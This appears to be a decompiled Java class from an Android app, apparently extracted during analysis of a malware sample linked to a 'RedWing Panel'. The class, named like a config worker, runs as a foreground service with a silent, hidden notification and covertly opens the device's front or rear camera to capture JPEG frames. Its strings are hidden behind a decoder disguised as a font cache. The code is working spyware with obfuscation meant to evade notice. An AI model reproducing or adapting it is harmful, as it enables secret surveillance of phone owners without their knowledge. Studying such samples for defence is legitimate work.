package app.mobilex.plus.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Size;
import app.mobilex.plus.util.TypefaceCache;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.ZSUCCvgkLgfCSFv;
import v.s.drzny1wQFcvLKP;
import v.s.s4Xe0OepSKbHpb3Nsd;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ConfigTQWorker extends Service {
    public static long b1EoSIRjJHO5;
    public static volatile byte[] ibVTtJUNfrGYbW;
    public boolean Ee8d2j4S9Vm5yGuR;
    public Handler JXn4Qf7zpnLjP5;
    public CameraDevice dDIMxZXP1V8HdM;
    public HandlerThread vekpFI4d1Nc4fakF;
    public ImageReader w9sT1Swbhx3hs;
    public final ZSUCCvgkLgfCSFv xDyLpEZyrcKVe0 = new ZSUCCvgkLgfCSFv(this);

    static {
        TypefaceCache.obtain("000000790055008100F900B800E60096001400790049008C00F500AD");
    }

    private static /* synthetic */ void abnzefavyx() {
    }

    public final void dDIMxZXP1V8HdM() {
        CameraDevice cameraDevice = this.dDIMxZXP1V8HdM;
        if (cameraDevice != null) {
            cameraDevice.close();
        }
        this.dDIMxZXP1V8HdM = null;
        ImageReader imageReader = this.w9sT1Swbhx3hs;
        if (imageReader != null) {
            imageReader.close();
        }
        this.w9sT1Swbhx3hs = null;
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onDestroy() {
        super.onDestroy();
        dDIMxZXP1V8HdM();
        HandlerThread handlerThread = this.vekpFI4d1Nc4fakF;
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
        try {
            HandlerThread handlerThread2 = this.vekpFI4d1Nc4fakF;
            if (handlerThread2 != null) {
                handlerThread2.join();
            }
            this.vekpFI4d1Nc4fakF = null;
            this.JXn4Qf7zpnLjP5 = null;
        } catch (InterruptedException e) {
            TypefaceCache.obtain("003000620054009700D200BE00D100AC002400640054009200FE00BB00E600AF00310073005A008300B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
        TypefaceCache.obtain("000000790055008100F900B800E60096001400790049008C00F500AD009200A300260065004F009500FF00A600D700A3");
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        String str;
        try {
            String strObtain = TypefaceCache.obtain("00200077005600B800E300B100D300B7");
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            NotificationChannel notificationChannel = new NotificationChannel(strObtain, TypefaceCache.obtain("0010006F0048009300F500B2"), 1);
            while (Runtime.getRuntime().maxMemory() < 0) {
                Thread.yield();
                Thread.yield();
            }
            notificationChannel.setShowBadge(false);
            notificationChannel.setSound(null, null);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, strObtain);
            s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
            Notification notificationDDIMxZXP1V8HdM = s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(9011, notificationDDIMxZXP1V8HdM, 64);
            } else {
                startForeground(9011, notificationDDIMxZXP1V8HdM);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("003300640054008A00FF00AB00D70081002C0064005E008000E200B000C700A90027002C001B");
            e.getMessage();
        }
        this.Ee8d2j4S9Vm5yGuR = intent != null ? intent.getBooleanExtra(TypefaceCache.obtain("002500640054008900E4008000D100A6002E007300490086"), false) : false;
        TypefaceCache.obtain("001700770050008E00FE00B8009200B7002B0079004F008800B000A800DB00B3002B0036");
        TypefaceCache.obtain("00630075005A008A00F500AD00D3");
        if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.CAMERA") != 0) {
            TypefaceCache.obtain("000000770056008200E200BE009200B7002600640056008E00E300AC00DB00A8002D00360055008800E400FF00D500B500220078004F008200F4");
            stopSelf();
            return 2;
        }
        HandlerThread handlerThread = new HandlerThread(TypefaceCache.obtain("000000770056008200E200BE00F000A60020007D005C009500FF00AA00DC00A3"));
        this.vekpFI4d1Nc4fakF = handlerThread;
        handlerThread.start();
        this.JXn4Qf7zpnLjP5 = new Handler(this.vekpFI4d1Nc4fakF.getLooper());
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        try {
            boolean z = true ^ this.Ee8d2j4S9Vm5yGuR;
            String[] cameraIdList = cameraManager.getCameraIdList();
            int length = cameraIdList.length;
            int i3 = 0;
            while (true) {
                if (i3 >= length) {
                    String[] cameraIdList2 = cameraManager.getCameraIdList();
                    if (cameraIdList2.length != 0) {
                        str = cameraIdList2[0];
                        break;
                    }
                    str = null;
                    break;
                }
                str = cameraIdList[i3];
                Integer num = (Integer) cameraManager.getCameraCharacteristics(str).get(CameraCharacteristics.LENS_FACING);
                if (num != null && num.intValue() == z) {
                    break;
                }
                i3++;
            }
            if (str == null) {
                TypefaceCache.obtain("000000770056008200E200BE009200A9002C0062001B008100FF00AA00DC00A3");
                stopSelf();
            } else {
                StreamConfigurationMap streamConfigurationMap = (StreamConfigurationMap) cameraManager.getCameraCharacteristics(str).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                Size[] outputSizes = streamConfigurationMap != null ? streamConfigurationMap.getOutputSizes(256) : null;
                int width = 640;
                int height = 480;
                if (outputSizes != null) {
                    for (Size size : outputSizes) {
                        if (size.getWidth() <= 1280 && size.getHeight() <= 720) {
                            width = size.getWidth();
                            height = size.getHeight();
                            break;
                        }
                    }
                }
                ImageReader imageReaderNewInstance = ImageReader.newInstance(width, height, 256, 2);
                this.w9sT1Swbhx3hs = imageReaderNewInstance;
                if (imageReaderNewInstance != null) {
                    imageReaderNewInstance.setOnImageAvailableListener(new drzny1wQFcvLKP(0, this), this.JXn4Qf7zpnLjP5);
                }
                if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.CAMERA") == 0) {
                    cameraManager.openCamera(str, this.xDyLpEZyrcKVe0, this.JXn4Qf7zpnLjP5);
                }
            }
        } catch (CameraAccessException e2) {
            TypefaceCache.obtain("000000770056008200E200BE009200A600200075005E009400E300FF00D700B500310079004900DD00B0");
            e2.getMessage();
            stopSelf();
        }
        return 2;
    }
}
